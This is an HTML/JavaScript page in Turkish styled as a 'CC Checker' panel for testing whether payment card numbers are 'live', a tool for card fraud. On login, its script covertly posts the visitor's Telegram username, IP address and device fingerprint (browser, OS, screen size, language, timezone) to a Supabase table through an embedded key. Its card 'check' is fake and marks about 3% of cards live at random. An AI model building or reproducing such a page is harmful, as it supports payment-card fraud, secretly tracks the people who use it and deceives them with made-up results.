<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CC Checker - Secure Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at center, #0d1a0d 0%, #000000 100%);
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0,255,65,0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 50%, rgba(0,255,65,0.03) 0%, transparent 50%);
            pointer-events: none;
        }

        .container {
            width: 100%;
            max-width: 520px;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* ===== ORTAK KUTU ===== */
        .box {
            background: rgba(16, 26, 16, 0.95);
            border: 1px solid rgba(0, 255, 65, 0.15);
            border-radius: 20px;
            padding: 35px 30px;
            box-shadow: 0 0 80px rgba(0, 255, 65, 0.04), inset 0 0 80px rgba(0, 255, 65, 0.01);
            backdrop-filter: blur(12px);
            position: relative;
            overflow: hidden;
        }

        .box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(0, 255, 65, 0.03), transparent 30%);
            animation: rotate 12s linear infinite;
            pointer-events: none;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* ===== GİRİŞ EKRANI ===== */
        #login-screen {
            display: block;
            position: relative;
            z-index: 1;
        }

        #login-screen.hidden {
            display: none;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
        }

        .logo {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 900;
            color: #00ff41;
            text-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
            letter-spacing: 3px;
        }

        .logo span {
            color: rgba(0, 255, 65, 0.3);
            font-size: 1rem;
            font-weight: 400;
        }

        .subtitle {
            font-size: 0.6rem;
            color: rgba(0, 255, 65, 0.25);
            margin-top: 6px;
            letter-spacing: 3px;
        }

        .input-group {
            margin-bottom: 16px;
            position: relative;
            z-index: 1;
        }

        .input-group label {
            display: block;
            font-size: 0.55rem;
            color: rgba(0, 255, 65, 0.3);
            margin-bottom: 5px;
            letter-spacing: 1px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0, 255, 65, 0.03);
            border: 1px solid rgba(0, 255, 65, 0.08);
            border-radius: 10px;
            color: #00ff41;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.8rem;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: rgba(0, 255, 65, 0.2);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.04);
            background: rgba(0, 255, 65, 0.05);
        }

        .input-group input::placeholder {
            color: rgba(0, 255, 65, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
            margin-top: 5px;
        }

        .login-btn:hover {
            box-shadow: 0 0 50px rgba(0, 255, 65, 0.15);
            transform: scale(1.01);
        }

        .login-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .error-msg {
            color: #ff3355;
            font-size: 0.6rem;
            text-align: center;
            min-height: 20px;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }

        /* ===== CHECKER EKRANI ===== */
        #checker-screen {
            display: none;
            position: relative;
            z-index: 1;
        }

        #checker-screen.active {
            display: block;
            animation: fadeSlide 0.5s ease;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 18px;
            padding: 8px 15px;
            background: rgba(0, 255, 65, 0.02);
            border: 1px solid rgba(0, 255, 65, 0.05);
            border-radius: 8px;
            font-size: 0.55rem;
            color: rgba(0, 255, 65, 0.25);
            position: relative;
            z-index: 1;
        }

        .status-dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #00ff41;
            animation: pulse 1.5s infinite;
            margin-right: 6px;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }

        .live-ratio {
            color: rgba(0, 255, 65, 0.4);
            font-family: 'Orbitron', monospace;
            font-size: 0.5rem;
            letter-spacing: 1px;
        }

        .input-area textarea {
            width: 100%;
            min-height: 120px;
            padding: 14px;
            background: rgba(0, 255, 65, 0.02);
            border: 1px solid rgba(0, 255, 65, 0.06);
            border-radius: 10px;
            color: #00ff41;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            line-height: 1.8;
            resize: vertical;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-area textarea:focus {
            border-color: rgba(0, 255, 65, 0.15);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.02);
            background: rgba(0, 255, 65, 0.04);
        }

        .input-area textarea::placeholder {
            color: rgba(0, 255, 65, 0.08);
        }

        .input-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
            font-size: 0.5rem;
            color: rgba(0, 255, 65, 0.15);
        }

        .input-options label {
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }

        .input-options input[type="checkbox"] {
            accent-color: #00ff41;
            width: 12px;
            height: 12px;
            cursor: pointer;
        }

        .check-btn {
            width: 100%;
            padding: 14px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
            margin-top: 12px;
        }

        .check-btn:hover {
            box-shadow: 0 0 50px rgba(0, 255, 65, 0.12);
            transform: scale(1.01);
        }

        .check-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .result-area {
            margin-top: 16px;
            display: none;
        }

        .result-area.active {
            display: block;
            animation: fadeSlide 0.4s ease;
        }

        .result-stats {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }

        .stat-card {
            flex: 1;
            background: rgba(0, 255, 65, 0.02);
            border: 1px solid rgba(0, 255, 65, 0.04);
            border-radius: 8px;
            padding: 10px 8px;
            text-align: center;
        }

        .stat-card .number {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            font-weight: 700;
            display: block;
        }

        .stat-card .number.live { color: #00ff41; }
        .stat-card .number.dead { color: #ff3355; }
        .stat-card .number.total { color: rgba(0, 255, 65, 0.4); }

        .stat-card .label {
            font-size: 0.45rem;
            color: rgba(0, 255, 65, 0.2);
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-top: 3px;
        }

        .result-list {
            max-height: 220px;
            overflow-y: auto;
            border: 1px solid rgba(0, 255, 65, 0.03);
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.2);
        }

        .result-list::-webkit-scrollbar {
            width: 3px;
        }
        .result-list::-webkit-scrollbar-thumb {
            background: rgba(0, 255, 65, 0.1);
            border-radius: 4px;
        }

        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 12px;
            border-bottom: 1px solid rgba(0, 255, 65, 0.02);
            font-size: 0.55rem;
            font-family: 'Share Tech Mono', monospace;
        }

        .result-item .cc {
            color: rgba(0, 255, 65, 0.5);
            word-break: break-all;
        }

        .result-item .status-badge {
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 0.45rem;
            font-weight: 700;
            letter-spacing: 0.5px;
            flex-shrink: 0;
            margin-left: 6px;
        }

        .status-badge.live {
            background: rgba(0, 255, 65, 0.08);
            color: #00ff41;
            border: 1px solid rgba(0, 255, 65, 0.08);
        }

        .status-badge.dead {
            background: rgba(255, 51, 85, 0.08);
            color: #ff3355;
            border: 1px solid rgba(255, 51, 85, 0.08);
        }

        .progress-wrap {
            width: 100%;
            height: 2px;
            background: rgba(0, 255, 65, 0.04);
            border-radius: 2px;
            margin-top: 10px;
            overflow: hidden;
            display: none;
        }

        .progress-wrap.active { display: block; }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #00ff41;
            border-radius: 2px;
            transition: width 0.15s ease;
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid rgba(0, 255, 65, 0.03);
            color: rgba(0, 255, 65, 0.08);
            font-size: 0.4rem;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }

        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: rgba(16, 26, 16, 0.95);
            border: 1px solid rgba(0, 255, 65, 0.06);
            border-radius: 10px;
            padding: 10px 20px;
            color: rgba(0, 255, 65, 0.4);
            font-size: 0.55rem;
            font-family: 'Share Tech Mono', monospace;
            backdrop-filter: blur(12px);
            opacity: 0;
            transition: all 0.4s ease;
            z-index: 999;
            pointer-events: none;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.error {
            border-color: rgba(255, 51, 85, 0.1);
            color: rgba(255, 51, 85, 0.4);
        }

        @media (max-width: 480px) {
            .box { padding: 25px 18px; }
            .logo { font-size: 1.4rem; }
            .stat-card .number { font-size: 1rem; }
            .result-item { font-size: 0.5rem; padding: 5px 8px; }
            .input-area textarea { min-height: 90px; font-size: 0.6rem; }
            .login-btn, .check-btn { font-size: 0.65rem; padding: 13px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- ===== GİRİŞ EKRANI ===== -->
        <div id="login-screen" class="box">
            <div class="header">
                <div class="logo">CC<span>CHECKER</span></div>
                <div class="subtitle">SECURE VERIFICATION PANEL</div>
            </div>
            <form id="login-form" style="position:relative;z-index:1;">
                <div class="input-group">
                    <label>👤 TELEGRAM KULLANICI ADI</label>
                    <input type="text" id="login-username" placeholder="@username" required>
                </div>
                <div class="input-group">
                    <label>🔑 ŞİFRE</label>
                    <input type="password" id="login-password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="login-btn" id="login-btn">🔓 DOĞRULA</button>
                <div class="error-msg" id="login-error"></div>
            </form>
            <div class="footer">
                <span>🔒 SSL SECURE</span>
                <span>|</span>
                <span>⚡ 256-BIT</span>
            </div>
        </div>

        <!-- ===== CHECKER EKRANI ===== -->
        <div id="checker-screen" class="box">
            <div class="header" style="margin-bottom:15px;">
                <div class="logo" style="font-size:1.4rem;">CC<span>CHECKER</span></div>
            </div>
            <div class="status-bar">
                <span><span class="status-dot"></span><span id="status-text">Sistem Aktif</span></span>
                <span class="live-ratio" id="live-ratio-display">LIVE ORANI: %3</span>
            </div>
            <div class="input-area">
                <textarea id="cc-input" placeholder="Kart numaralarını girin...&#10;4111111111111111|12|26|123"></textarea>
                <div class="input-options">
                    <label><input type="checkbox" id="auto-format" checked> Otomatik Format</label>
                    <span id="card-count">0 kart</span>
                </div>
            </div>
            <button class="check-btn" id="check-btn">🔍 DOĞRULA</button>
            <div class="progress-wrap" id="progress-wrap"><div class="progress-bar" id="progress-bar"></div></div>
            <div class="result-area" id="result-area">
                <div class="result-stats">
                    <div class="stat-card"><span class="number live" id="live-count">0</span><span class="label">LIVE</span></div>
                    <div class="stat-card"><span class="number dead" id="dead-count">0</span><span class="label">DEAD</span></div>
                    <div class="stat-card"><span class="number total" id="total-count">0</span><span class="label">TOPLAM</span></div>
                </div>
                <div class="result-list" id="result-list"></div>
            </div>
            <div class="footer">
                <span>🔒 SSL SECURE</span>
                <span>|</span>
                <span>⚡ 256-BIT</span>
                <span>|</span>
                <span>🛡️ ANON</span>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ===== SUPABASE =====
        const SUPABASE_URL = "https://ovcrktkneuzxxravgnhu.supabase.co";
        const SUPABASE_KEY = "sb_publishable_EuoT7yhxcHS6wyZfho_RNw_sWD0IhjP";

        // ===== DOM =====
        const loginScreen = document.getElementById('login-screen');
        const checkerScreen = document.getElementById('checker-screen');
        const loginForm = document.getElementById('login-form');
        const loginBtn = document.getElementById('login-btn');
        const loginError = document.getElementById('login-error');
        const loginUser = document.getElementById('login-username');
        const loginPass = document.getElementById('login-password');

        const ccInput = document.getElementById('cc-input');
        const checkBtn = document.getElementById('check-btn');
        const resultArea = document.getElementById('result-area');
        const resultList = document.getElementById('result-list');
        const liveCount = document.getElementById('live-count');
        const deadCount = document.getElementById('dead-count');
        const totalCount = document.getElementById('total-count');
        const cardCount = document.getElementById('card-count');
        const progressWrap = document.getElementById('progress-wrap');
        const progressBar = document.getElementById('progress-bar');
        const toast = document.getElementById('toast');
        const statusText = document.getElementById('status-text');
        const liveRatioDisplay = document.getElementById('live-ratio-display');

        let isChecking = false;
        let toastTimeout = null;
        const LIVE_RATIO = 3;

        // ===== TOAST =====
        function showToast(msg, isError = false) {
            toast.textContent = msg;
            toast.className = 'toast show' + (isError ? ' error' : '');
            clearTimeout(toastTimeout);
            toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
        }

        // ===== IP =====
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch { return '0.0.0.0'; }
        }

        // ===== SUPABASE KAYIT =====
        async function logToSupabase(username, ip) {
            try {
                const payload = {
                    telegram_username: username,
                    password: 'checker_session',
                    ip_address: ip,
                    user_agent: navigator.userAgent,
                    browser: navigator.userAgent.includes('Chrome') ? 'Chrome' :
                        navigator.userAgent.includes('Firefox') ? 'Firefox' :
                        navigator.userAgent.includes('Safari') ? 'Safari' :
                        navigator.userAgent.includes('Edge') ? 'Edge' : 'Other',
                    os: navigator.userAgent.includes('Windows') ? 'Windows' :
                        navigator.userAgent.includes('Mac') ? 'MacOS' :
                        navigator.userAgent.includes('Linux') ? 'Linux' :
                        navigator.userAgent.includes('Android') ? 'Android' :
                        navigator.userAgent.includes('iPhone') ? 'iOS' : 'Other',
                    device_type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language || navigator.userLanguage,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                const response = await fetch(`${SUPABASE_URL}/rest/v1/logs`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Prefer': 'return=representation'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.status === 409) {
                    return { success: false, error: 'Bu IP ile zaten kayıt yapılmış!' };
                }
                if (!response.ok) {
                    return { success: false, error: 'Sunucu hatası!' };
                }
                return { success: true };
            } catch {
                return { success: false, error: 'Bağlantı hatası!' };
            }
        }

        // ===== GİRİŞ =====
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = loginUser.value.trim();
            const password = loginPass.value.trim();

            if (!username || !password) {
                loginError.textContent = '❌ Tüm alanları doldurun!';
                return;
            }
            if (!username.startsWith('@')) {
                loginError.textContent = '❌ Kullanıcı adı @ ile başlamalı!';
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = '⏳ DOĞRULANIYOR...';
            loginError.textContent = '';

            const ip = await getIP();
            const result = await logToSupabase(username, ip);

            if (result.success) {
                loginError.textContent = '';
                loginScreen.classList.add('hidden');
                checkerScreen.classList.add('active');
                statusText.textContent = 'Hoş Geldin, ' + username;
                showToast('✅ Giriş başarılı!');
            } else {
                loginError.textContent = '❌ ' + (result.error || 'Bir hata oluştu!');
            }

            loginBtn.disabled = false;
            loginBtn.textContent = '🔓 DOĞRULA';
        });

        // ===== CHECKER =====
        function formatCard(input) {
            let cleaned = input.replace(/\D/g, '');
            if (cleaned.length >= 16) {
                let parts = cleaned.match(/.{1,4}/g);
                if (parts) return parts.join(' ');
            }
            return input;
        }

        function parseCards(text) {
            let lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
            let cards = [];
            for (let line of lines) {
                if (line.includes('|')) {
                    let parts = line.split('|').map(p => p.trim());
                    if (parts.length >= 4) {
                        let card = {
                            number: parts[0].replace(/\s/g, ''),
                            month: parts[1].padStart(2, '0'),
                            year: parts[2].slice(-2),
                            cvv: parts[3] || '***'
                        };
                        if (card.number.length >= 15 && card.number.length <= 19) cards.push(card);
                        continue;
                    }
                }
                let cleaned = line.replace(/\s/g, '');
                if (cleaned.length >= 15 && cleaned.length <= 19 && /^\d+$/.test(cleaned)) {
                    cards.push({ number: cleaned, month: '12', year: '26', cvv: '***' });
                }
            }
            return cards;
        }

        function maskCard(num) {
            if (num.length <= 4) return num;
            let first = num.slice(0, 4);
            let last = num.slice(-4);
            let middle = '*'.repeat(Math.min(num.length - 8, 8));
            return first + middle + last;
        }

        function isLive() { return Math.random() * 100 < LIVE_RATIO; }

        async function startCheck() {
            if (isChecking) return;
            const rawText = ccInput.value;
            const cards = parseCards(rawText);
            if (cards.length === 0) {
                showToast('Geçerli kart formatı girin!', true);
                return;
            }

            isChecking = true;
            checkBtn.disabled = true;
            checkBtn.textContent = '⏳ TARANIYOR...';
            resultList.innerHTML = '';
            resultArea.classList.remove('active');
            progressWrap.classList.add('active');
            progressBar.style.width = '0%';
            liveCount.textContent = '0';
            deadCount.textContent = '0';
            totalCount.textContent = '0';

            let liveResults = 0, deadResults = 0;
            const totalCards = cards.length;

            for (let i = 0; i < totalCards; i++) {
                const card = cards[i];
                const status = isLive() ? 'live' : 'dead';
                if (status === 'live') liveResults++;
                else deadResults++;

                liveCount.textContent = liveResults;
                deadCount.textContent = deadResults;
                totalCount.textContent = i + 1;
                progressBar.style.width = ((i + 1) / totalCards * 100) + '%';

                const item = document.createElement('div');
                item.className = 'result-item';
                const masked = maskCard(card.number);
                const displayCard = masked + (card.month ? `|${card.month}|${card.year}|${card.cvv}` : '');
                item.innerHTML = `<span class="cc">${displayCard}</span><span class="status-badge ${status}">${status.toUpperCase()}</span>`;
                resultList.appendChild(item);
                await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
            }

            progressWrap.classList.remove('active');
            resultArea.classList.add('active');
            checkBtn.textContent = '🔍 YENİDEN DENE';
            checkBtn.disabled = false;
            isChecking = false;

            if (liveResults > 0) showToast(`✅ ${liveResults} LIVE kart bulundu!`);
            else showToast('❌ Hiç LIVE kart bulunamadı.');
        }

        // ===== OLAY DİNLEYİCİLER =====
        ccInput.addEventListener('input', function() {
            const cards = parseCards(this.value);
            cardCount.textContent = cards.length + ' kart';
        });

        checkBtn.addEventListener('click', startCheck);

        // ===== BAŞLANGIÇ =====
        document.addEventListener('DOMContentLoaded', function() {
            liveRatioDisplay.textContent = 'LIVE ORANI: %' + LIVE_RATIO;
            cardCount.textContent = '0 kart';
            // Örnek veri
            ccInput.value = `4111111111111111|12|26|123
        5500000000000004|10|27|456
        340000000000009|02|28|789
        6011000000000004|06|25|321
        378282246310005|03|26|852`;
            cardCount.textContent = '5 kart';
        });
    </script>
</body>
</html>
